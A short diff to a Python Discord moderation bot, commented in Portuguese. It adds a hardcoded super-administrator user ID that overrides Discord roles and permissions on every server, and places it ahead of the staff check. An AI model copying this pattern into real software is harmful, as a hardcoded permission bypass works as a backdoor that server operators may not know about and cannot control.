@@ -280,9 +280,22 @@ def punicoes_ativas_temporarias(guild_id: int) -> list:
     return [r for r in registros if r.get("ativo") and r.get("expira_em")]
 
 
+# ── Super administradores ─────────────────────────────────────────────────────
+# IDs que têm acesso liberado a QUALQUER comando do bot, em qualquer servidor,
+# independente de cargo/permissão do Discord. Usado pelo patch global de
+# permissões em main.py (liberar_super_admins) e pela checagem de staff abaixo.
+SUPER_ADMIN_IDS = {1487452210605588592}
+
+
+def eh_super_admin(user_id: int) -> bool:
+    return user_id in SUPER_ADMIN_IDS
+
+
 # ── Hierarquia de permissões ─────────────────────────────────────────────────
 def eh_staff(member: discord.Member, guild_id: int) -> bool:
     """Considera staff quem tem permissão de moderar OU tem um dos cargos configurados."""
+    if eh_super_admin(member.id):
+        return True
     if member.guild_permissions.moderate_members or member.guild_permissions.administrator:
         return True
     cfg = get_config(guild_id)
